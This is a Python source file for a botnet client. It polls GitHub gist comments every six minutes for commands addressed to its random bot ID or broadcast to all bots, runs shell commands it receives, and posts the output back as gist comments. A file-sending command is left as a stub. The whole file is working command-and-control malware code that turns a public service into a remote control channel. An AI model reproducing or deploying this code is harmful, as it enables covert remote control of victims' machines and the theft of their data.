import sys
import random
import time
import utils
from utils import Command

REFRESH_DELAY = 360  # 6 minutes

BOT_ID = 0
LOG = []
LAST_COMMENT = 0


def error(cmd, data, r):
    return "ERROR: " + str(cmd) + "\ndata: " + data + "\nr: " + str(r)


def handle_command(cmd, data, r):
    if cmd == Command.HEARTBEAT:
        out = ""

    elif cmd == Command.CMD:
        if (data == None):
            out = error(cmd, data, r)
        else:
            out = utils.perform_command(data)

    elif cmd == Command.SEND_FILE:
        if (data == None):
            out = error(cmd, data, r)
        else:
            out = send_file(data)

    LOG.append(out)
    if r: return respond(out)
    return out


def respond(data):
    comment = parse_response(data)
    return utils.post_gist_comment(comment)


# TODO rework
def parse_response(data):
    return str(BOT_ID) + '\n' + data


# TODO rework
# TODO check if parsable
def parse_command(comment):
    bot, cmd, d, r = comment.split('\n')[:4]
    bot = int(bot)
    cmd = Command[cmd]
    r = bool(int(r))
    return bot, cmd, d, r


def check_for_commands():
    global LAST_COMMENT
    data, LAST_COMMENT = utils.get_fresh_comments(LAST_COMMENT)
    
    handled = 0
    for comment in data:
        bot, cmd, d, r = parse_command(comment['body'])
        if bot == utils.BROADCAST or bot == BOT_ID:
            handle_command(cmd, d, r)
            handled += 1
    return handled


def send_file():
    # TODO
    return None


if __name__ == "__main__":
    BOT_ID = random.randint(1, sys.maxsize)
    utils.init_config()

    while True:
        time.sleep(REFRESH_DELAY)
        check_for_commands()
